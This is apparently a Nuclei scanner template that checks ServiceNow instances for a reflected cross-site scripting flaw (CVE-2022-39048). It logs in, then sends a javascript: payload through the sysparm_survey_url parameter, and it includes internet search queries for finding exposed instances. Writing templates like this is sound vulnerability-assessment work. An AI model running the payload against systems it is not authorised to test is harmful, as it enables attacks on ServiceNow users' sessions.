http:
- extractors:
  - group: 1
    internal: true
    name: csrf
    part: body
    regex:
    - name="sysparm_ck" id="sysparm_ck" type="hidden" value="(.*?)"
    type: regex
  matchers:
  - condition: and
    part: body_3
    type: word
    words:
    - unwrapped_url = "javascript:alert(document.domain)//assessment_take2.do"
    - assessment_list.do
  - part: header_3
    type: word
    words:
    - text/html
  - part: header_3
    status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /navpage.do HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /login.do HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    sysparm_ck={{csrf}}&user_name={{username}}&user_password={{password}}&not_important=&ni.nolog.user_password=true&ni.noecho.user_name=true&ni.noecho.user_password=true&screensize=1920x1080&sys_action=sysverb_login&sysparm_login_url=welcome.do

    '
  - 'GET /assessment_redirect.do?sysparm_survey_url=javascript:alert(document.domain)//assessment_take2.do
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-39048
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:servicenow:servicenow:quebec:-:*:*:*:*:*:*
    cve-id: CVE-2022-39048
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.94981
    epss-score: 0.18293
  description: 'A XSS vulnerability was identified in the ServiceNow UI page assessment_redirect.
    To exploit this vulnerability, an attacker would need to persuade an authenticated
    user to click a maliciously crafted URL. Successful exploitation potentially could
    be used to conduct various client-side attacks, including, but not limited to,
    phishing, redirection, theft of CSRF tokens, and use of an authenticated user''s
    browser or session to attack other systems.

    '
  impact: 'Authenticated attackers can craft malicious URLs with JavaScript in the
    sysparm_survey_url parameter that executes when victims click the link, potentially
    stealing CSRF tokens, session cookies, or conducting phishing attacks to compromise
    ServiceNow authenticated users.

    '
  metadata:
    fofa-query:
    - title="servicenow"
    - icon_hash=1701804003
    google-query: intitle:"servicenow"
    max-request: 3
    product: servicenow
    shodan-query:
    - http.title:"ServiceNow"
    - http.title:"servicenow"
    - http.favicon.hash:1701804003
    vendor: servicenow
    verified: true
  name: ServiceNow - Cross-site Scripting
  reference:
  - https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1221892
  - https://blog.amanrawat.in/2023/05/05/CVE-2022-39048.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-39048
  - https://support.servicenow.com/
  remediation: 'Update ServiceNow to the latest patched version that properly sanitizes
    the sysparm_survey_url parameter in assessment_redirect.do.

    '
  severity: medium
  tags: cve,cve2022,xss,servicenow,authenticated,vuln
